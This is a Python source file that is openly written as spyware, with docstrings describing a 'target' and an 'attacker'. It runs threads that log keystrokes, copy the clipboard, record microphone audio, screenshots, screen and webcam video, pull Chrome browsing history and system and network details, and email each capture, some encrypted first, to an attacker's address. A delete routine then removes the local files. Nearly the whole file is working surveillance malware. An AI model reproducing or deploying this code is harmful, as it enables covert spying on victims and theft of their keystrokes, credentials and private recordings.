from concurrent.futures import ThreadPoolExecutor
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from scipy.io.wavfile import write
from dotenv import load_dotenv
from time import perf_counter
from PIL import ImageGrab
import sounddevice as sd
from requests import get
# import win32clipboard
import numpy as np
import subprocess
import clipboard
import pyautogui
import platform
import sqlite3
import logging
import psutil
import socket
import uuid
import csv
import cv2
import re
import os

from mailer import send_mail_with_attachment

load_dotenv()

logger = logging.getLogger("malware_logger")
logger.setLevel(logging.DEBUG)

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%m-%d %H:%M",
    filename="malware.log",
)

console = logging.StreamHandler()
console.setLevel(logging.INFO)
formatter = logging.Formatter("%(name)s: %(levelname)s %(message)s")
console.setFormatter(formatter)
logger.addHandler(console)

# File names to store data
keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
chrome_info = "chrome_info.csv"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
screen_record_vid = "screen_record.mp4"
front_cam_vid = "front_cam.mp4"

# Encrypted file names
keys_info_e = "e_key_log.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard.txt"
chrome_info_e = "e_chrome_info.csv"

base_path = os.getenv("LINUX_BASE_PATH")
email_report = os.getenv("REPORT_MAIL")

logger.info("Using Base Path: %s", base_path)

# Windows Path
# file_path = os.getenv("WINDOWS_BASE_PATH")
# extend_path = "\\"
# file_merge = file_path+extend_path


def get_size(bytes, suffix="B") -> str:
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'

    Args:
        bytes: Number of bytes to convert
        suffix: Unit of bytes

    Returns:
        str
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def system_information() -> None:
    """
    Logs system information on target machine and writes to
    file then sends encrypted data to attacker via email

    Args:
        None

    Returns:
        None
    """
    file_path = os.path.join(base_path, system_info)

    with open(file_path, "a") as f:
        logger.info("Writing System Information To File %s", file_path)

        f.write("SYSTEM INFORMATION:\n")
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)

        try:
            external_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + external_ip + "\n")
        except Exception:
            logger.exception("Could Not Access Public IP Address Via API")
            f.write("Couldn't get public IP address!\n")

        try:
            f.write("Processor: " + platform.processor() + "\n")
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + ip_addr + "\n")
            f.write("Network Name: " + platform.node() + "\n")
            f.write(
                "MAC Address: "
                + ":".join(re.findall("..", "%012x" % uuid.getnode()))
                + "\n"
            )
            f.write(
                "RAM: "
                + str(round(psutil.virtual_memory().total / (1024.0**3)))
                + " GB\n"
            )
            f.write("System Release: " + platform.release() + "\n")
            arch = platform.architecture()
            f.write("Architecture: (" + arch[0] + ", " + arch[1] + ")\n")
            f.write("Platform: " + platform.platform() + "\n\n")
        except:
            logger.exception("Basic System Information Capturing Error")
            print("Error Capturing Basic System Information")

        try:
            logger.info("Writing CPU Information To File %s", file_path)

            f.write("CPU INFORMATION\n")
            phys_cores = str(psutil.cpu_count(logical=False))
            f.write("Physical Cores: " + phys_cores + "\n")
            tot_cores = str(psutil.cpu_count(logical=True))
            f.write("Total Cores: " + tot_cores + "\n")
            cpufreq = psutil.cpu_freq()
            max_freq = str(cpufreq.max)
            min_freq = str(cpufreq.min)
            curr_freq = str(cpufreq.current)
            f.write("Max Frequency: " + max_freq + " Mhz\n")
            f.write("Min Frequency: " + min_freq + " Mhz\n")
            f.write("Current Frequency: " + curr_freq + " Mhz\n")

            for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                f.write(f"Core {i}: {percentage}%\n")
            f.write(f"Total CPU Usage: {psutil.cpu_percent()}%\n\n")
        except:
            logger.exception("CPU Information Capturing Error")
            print("Error Capturing CPU Information")

        try:
            logger.info("Writing Memory Usage Information To File %s", file_path)

            f.write("MEMORY USAGE:\n")
            svmem = psutil.virtual_memory()
            f.write(f"Total: {get_size(svmem.total)}\n")
            f.write(f"Available: {get_size(svmem.available)}\n")
            f.write(f"Used: {get_size(svmem.used)}\n")
            f.write(f"Percentage: {svmem.percent}%\n")
            swap = psutil.swap_memory()
            f.write(f"Total: {get_size(swap.total)}\n")
            f.write(f"Free: {get_size(swap.free)}\n")
            f.write(f"Used: {get_size(swap.used)}\n")
            f.write(f"Percentage: {swap.percent}%\n\n")
        except:
            logger.exception("Memory Usage Information Capturing Error")
            print("Error Capturing Memory Usage Information")

        try:
            logger.info("Writing Disk Information To File %s", file_path)

            f.write("DISK INFORMATION\n")
            partitions = psutil.disk_partitions()
            for partition in partitions:
                f.write(f"Device: {partition.device}\n")
                f.write(f"Mountpoint: {partition.mountpoint}\n")
                f.write(f"File System Type: {partition.fstype}\n")
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:
                    continue
                f.write(f"Total Size: {get_size(partition_usage.total)}\n")
                f.write(f"Used: {get_size(partition_usage.used)}\n")
                f.write(f"Free: {get_size(partition_usage.free)}\n")
                f.write(f"Percentage: {partition_usage.percent}%\n")
        except:
            logger.exception("Disk Information Capturing Error")
            print("Error Capturing Disk Information")

        try:
            logger.info("Writing I/O Statistics To File %s", file_path)

            f.write("IO STATISTICS\n")
            disk_io = psutil.disk_io_counters()
            f.write(f"Total Read: {get_size(disk_io.read_bytes)}\n")
            f.write(f"Total Write: {get_size(disk_io.write_bytes)}\n\n")
        except:
            logger.exception("I/O Statistics Capturing Error")
            print("Error Capturing I/O Statistics")

        try:
            logger.info("Writing Network Information To File %s", file_path)

            f.write("NETWORK INFORMATION\n")
            if_addrs = psutil.net_if_addrs()
            for interface_name, interface_addresses in if_addrs.items():
                for address in interface_addresses:
                    f.write(f"Interface: {interface_name}\n")
                    if str(address.family) == "AddressFamily.AF_INET":
                        f.write(f"IP Address: {address.address}\n")
                        f.write(f"Netmask: {address.netmask}\n")
                        f.write(f"Broadcast IP: {address.broadcast}\n")
                    elif str(address.family) == "AddressFamily.AF_PACKET":
                        f.write(f"MAC Address: {address.address}\n")
                        f.write(f"Netmask: {address.netmask}\n")
                        f.write(f"Broadcast MAC: {address.broadcast}\n")
        except:
            logger.exception("Network Information Capturing Error")
            print("Error Capturing Network Information")

        f.close()

    try:
        logger.info("Sending System Information Encrypted Mail")

        encrypt_and_mail(
            file_path,
            os.path.join(base_path, system_info_e),
            system_info,
            os.path.join(base_path, system_info_e),
            email_report,
        )

        logger.info("Sent System Information Encrypted Mail")
    except:
        logger.critical("System Information Mailing Error")
        print("Error Sending Mail")


def chrome_history() -> None:
    """
    Gets browser history of target by accessing the history log file then
    writes it to CSV file. Sends encrypted data to the attacker via email

    Args:
        None

    Returns:
        None
    """
    file_path = os.path.join(base_path, chrome_info)

    try:
        logger.info("Creating Browser History Log File %s", file_path)

        headers = ["URL", "TITLE", "VISIT COUNT", "TIME OF LAST VISIT"]
        with open(file_path, "w", newline="") as fh:
            writer = csv.writer(fh)
            writer.writerow(headers)
            fh.close()

        logger.info("Created Browser History Log File")
    except:
        logger.exception("Browser History Log File Creation Error")
        print("Error Creating CSV Browser History Log File")

    try:
        conn = sqlite3.connect("/home/nvombat/.config/google-chrome/Default/History")
    except:
        logger.critical("SQL Server Connection Error")
        print("Error Connecting To Server")

    c = conn.cursor()

    try:
        c.execute("select url, title, visit_count, last_visit_time from urls")
        results = c.fetchall()

        with open(file_path, "a", newline="") as fh:
            for r in results:
                writer = csv.writer(fh)
                writer.writerow(r)

        fh.close()

        logger.info("Browser History Logged Successfully")

    except sqlite3.OperationalError:
        logger.warning("Browser In Use - Unable To Access Locked File")
        print("Browser Currently In Use")

    c.close()

    try:
        logger.info("Sending Browser History Information Encrypted Mail")

        encrypt_and_mail(
            file_path,
            os.path.join(base_path, chrome_info_e),
            chrome_info,
            os.path.join(base_path, chrome_info_e),
            email_report,
        )

        logger.info("Sent Browser History Information Encrypted Mail")
    except:
        logger.critical("Browser History Information Mailing Error")
        print("Error Sending Mail")


def clipboard_information() -> None:
    """
    Logs clipboard information to a file which is encrypted
    and then emailed to the attacker

    Args:
        None

    Returns:
        None
    """
    file_path = os.path.join(base_path, clipboard_info)

    try:
        with open(file_path, "a") as f:
            logger.info("Writing Clipboard Data To File %s", file_path)

            try:
                clipboard_data = clipboard.paste()
                f.write("Clipboard Data:\n" + clipboard_data)

                logger.info("Captured Clipboard Information Successfully")

                # win32clipboard.OpenClipboard(0)
                # clipboard_data = win32clipboard.GetClipboardData()
                # win32clipboard.CloseClipboard()
                # f.write("Clipboard Data: \n" + clipboard_data)
            except:
                logger.exception("Clipboard Information Capturing Error")
                print("Clipboard Information Couldn't Be Captured")

            f.close()

        try:
            logger.info("Sending Clipboard Information Encrypted Mail")

            encrypt_and_mail(
                file_path,
                os.path.join(base_path, clipboard_info_e),
                clipboard_info,
                os.path.join(base_path, clipboard_info_e),
                email_report,
            )

            logger.info("Sent Clipboard Information Encrypted Mail")

        except:
            logger.critical("Clipboard Information Mailing Error")
            print("Error Sending Mail")
    except:
        logger.critical("Clipboard Information File Writing Error")
        print("Clipboard Information Couldn't Be Captured")


def sound_information() -> None:
    """
    Records audio from the target mic and then emails recording
    to the attacker

    Args:
        None

    Returns:
        None
    """
    try:
        logger.info("Recording Audio")

        fs = 44100  # Sampling frequency
        duration = 5
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()

        file_path = os.path.join(base_path, audio_info)
        write(file_path, fs, recording)

        logger.info("Audio Recorded Successfully")
    except:
        logger.info("Audio Recording Error")
        print("Error Recording Audio")

    try:
        logger.info("Sending Audio Recording Mail")

        send_mail_with_attachment(audio_info, file_path, email_report)

        logger.info("Sent Audio Mail")
    except:
        logger.critical("Audio Recording Mailing Error")
        print("Error Sending Mail")


def screenshot() -> None:
    """
    Captures a screenshot of the target screen and then emails the image
    to the attacker

    Args:
        None

    Returns:
        None
    """
    try:
        logger.info("Capturing Screenshot")

        screenshot = ImageGrab.grab(
            bbox=None, include_layered_windows=False, all_screens=False, xdisplay=None
        )

        file_path = os.path.join(base_path, screenshot_info)
        screenshot.save(file_path)

        logger.info("Screenshot Captured Successfully")
    except:
        logger.exception("Screenshot Capturing Error")
        print("Error Capturing Screenshot")

    try:
        logger.info("Sending Screenshot Email")

        send_mail_with_attachment(screenshot_info, file_path, email_report)

        logger.info("Sent Screenshot Email")
    except:
        logger.critical("Screenshot Mailing Error")
        print("Error Sending Mail")


def get_screen_resolution() -> dict:
    """
    Gets the screen resolution of the target screen

    Args:
        None

    Returns:
        dict
    """
    try:
        output = subprocess.Popen(
            'xrandr | grep "\*" | cut -d" " -f4', shell=True, stdout=subprocess.PIPE
        ).communicate()[0]
        resolution = output.split()[0].split(b"x")
        return {"width": resolution[0].decode(), "height": resolution[1].decode()}
    except:
        logger.error("Screen Resolution Error")
        print("Error Getting Screen Resolution")


def record_frontcam() -> None:
    """
    Records a video of the target from the front camera and then emails
    the video to the attacker

    Args:
        None

    Returns:
        None
    """
    file_path_front_cam = os.path.join(base_path, front_cam_vid)

    try:
        logger.info("Recording Front Camera")

        resolution = get_screen_resolution()
        width = int(resolution["width"])
        height = int(resolution["height"])
        res = (width, height)

        codec = cv2.VideoWriter_fourcc("m", "p", "4", "v")
        fps = 60.0

        front_cam = cv2.VideoWriter(file_path_front_cam, codec, fps, res)

        webcam = cv2.VideoCapture(0)
        start = perf_counter()

        while True:
            fc = ImageGrab.grab(bbox=(0, 0, width, height))
            img_np = np.array(fc)
            img_final = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)
            _, frame1 = webcam.read()
            fr_height, fr_width, _ = frame1.shape
            img_final[0:fr_height, 0:fr_width, :] = frame1[0:fr_height, 0:fr_width, :]
            front_cam.write(img_final)

            end = perf_counter()
            if int(end - start) == 10:
                logger.info("Front Camera Video Recorded Successfully")
                break
    except:
        logger.exception("Front Camera Video Recording Error")
        print("Error Recording Video From Front Camera")

    try:
        logger.info("Sending Front Camera Video Mail")

        send_mail_with_attachment(front_cam_vid, file_path_front_cam, email_report)

        logger.info("Sent Front Camera Video Mail")
    except:
        logger.critical("Front Camera Video Mailing Error")
        print("Error Sending Mail")


def record_screen() -> None:
    """
    Records the screen of the user and then emails the video
    to the user

    Args:
        None

    Returns:
        None
    """
    file_path_screen = os.path.join(base_path, screen_record_vid)

    try:
        logger.info("Recording Screen")

        resolution = get_screen_resolution()
        width = int(resolution["width"])
        height = int(resolution["height"])
        res = (width, height)

        codec = cv2.VideoWriter_fourcc("m", "p", "4", "v")
        fps = 60.0

        screen = cv2.VideoWriter(file_path_screen, codec, fps, res)

        start = perf_counter()

        while True:
            sc = pyautogui.screenshot()
            frame2 = np.array(sc)
            frame2 = cv2.cvtColor(frame2, cv2.COLOR_BGR2RGB)
            screen.write(frame2)

            end = perf_counter()
            if int(end - start) == 10:
                logger.info("Recorded Screen Successfully")
                break
    except:
        logger.exception("Screen Recording Error")
        print("Error Recording User Screen")

    try:
        logger.info("Sending Screen Recording Mail")

        send_mail_with_attachment(screen_record_vid, file_path_screen, email_report)

        logger.info("Sent Screen Recording Mail")
    except:
        logger.critical("Screen Recording Mailing Error")
        print("Error Sending Mail")


class logKeys:
    """
    Logs the keypresses of the target and writes them to a file.
    The file is encrypted and then sent to the attacker via
    email
    """

    def __init__(self):
        self.count = 0
        self.keys = []
        self.file_path = os.path.join(base_path, keys_info)
        self.e_file_path = os.path.join(base_path, keys_info_e)

    # When a key is pressed
    def on_press(self, key):
        # Keep track of key presses and the number of keys pressed
        self.keys.append(key)
        self.count = self.count + 1
        print("{0} pressed".format(key))
        # Write to file after every 15 key presses and reset variables
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    # When a key is released
    def on_release(self, key):
        # Condition to exit keylogger
        if key == Key.esc:
            return False

    # Write the key presses to a file
    def write_file(self, keys):
        with open(self.file_path, "a") as f:
            for key in keys:
                # Format key to be readable
                formatted_key = str(key).replace("'", "")
                if formatted_key.find("space") > 0:
                    f.write("\n")
                # If not a special key then write to file otherwise ignore
                elif formatted_key.find("Key") == -1:
                    f.write(formatted_key)

    # Logs keypresses
    def log(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        print("Logging Complete")

        try:
            encrypt_and_mail(
                self.file_path,
                self.e_file_path,
                keys_info,
                self.e_file_path,
                email_report,
            )
        except:
            print("Error Sending Mail")


def run_key_logger() -> None:
    """
    Runs Keylogger

    Args:
        None

    Returns:
        None
    """
    try:
        logger.info("Logging Keys")

        keyLog = logKeys()
        keyLog.log()

        logger.info("Keys Logged Successfully")
    except:
        logger.critical("Keylogging Error")


def run_parallel() -> None:
    """
    Runs all the tasks of the malware on different threads to allow for
    asynchronous behavior of malware

    Args:
        None

    Returns:
        None
    """
    try:
        logger.info("Creating Threadpool")
        executor = ThreadPoolExecutor(max_workers=8)

        logger.info("Running Threads")
        t1 = executor.submit(run_key_logger)
        t2 = executor.submit(system_information)
        t3 = executor.submit(clipboard_information)
        t4 = executor.submit(sound_information)
        t5 = executor.submit(screenshot)
        t6 = executor.submit(record_screen)
        t7 = executor.submit(record_frontcam)
        t8 = executor.submit(chrome_history)

        executor.shutdown(wait=True)
    except:
        logger.critical("Threading Error")
        print("Error Running Threads")


def encrypt_and_mail(
    file_to_encrypt: str,
    encrypted_file_name: str,
    filename: str,
    attachment: str,
    email: str,
) -> None:
    """
    Encrypts Files And Mails Them To Attacker

    Args:
        file_to_encrypt: File To Be Encrypted
        encrypted_file_name: Encrypted File Name
        filename: Name of File
        attachment: File Attachment
        email: Email of Attacker

    Returns:
        None
    """
    key = os.getenv("ENCRYPTION_KEY")

    with open(file_to_encrypt, "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_name, "wb") as f:
        f.write(encrypted)

    send_mail_with_attachment(filename, attachment, email)


def encrypt_files() -> None:
    """
    Encrypts Files

    Args:
        None

    Returns:
        None
    """
    key_path = os.path.join(base_path, keys_info)
    clip_path = os.path.join(base_path, clipboard_info)
    sys_path = os.path.join(base_path, system_info)
    chrome_path = os.path.join(base_path, chrome_info)

    key_e_path = os.path.join(base_path, keys_info_e)
    clip_e_path = os.path.join(base_path, clipboard_info_e)
    sys_e_path = os.path.join(base_path, system_info_e)
    chrome_e_path = os.path.join(base_path, chrome_e_path)

    files_to_encrypt = [key_path, clip_path, sys_path, chrome_path]
    encrypted_file_names = [key_e_path, clip_e_path, sys_e_path, chrome_e_path]

    cnt = 0
    key = os.getenv("ENCRYPTION_KEY")

    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[cnt], "rb") as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[cnt], "wb") as f:
            f.write(encrypted)

        cnt += 1


def delete_files() -> None:
    """
    Deletes Files

    Args:
        None

    Returns:
        None
    """
    files = [
        system_info,
        clipboard_info,
        keys_info,
        audio_info,
        screenshot_info,
        screen_record_vid,
        front_cam_vid,
        chrome_info,
    ]
    encrypted_files = [system_info_e, clipboard_info_e, keys_info_e, chrome_info_e]

    for file in files:
        try:
            logger.info("Deleting Files")
            os.remove(os.path.join(base_path, file))
        except Exception:
            logger.warning("File %s Not Found", file)
            print("File %s Not Found" % file)

    for file in encrypted_files:
        try:
            logger.info("Deleting Encrypted Files")
            os.remove(os.path.join(base_path, file))
        except Exception:
            logger.warning("Encrypted File %s Not Found", file)
            print("Encrypted File %s Not Found" % file)


if __name__ == "__main__":
    run_parallel()
    # delete_files()
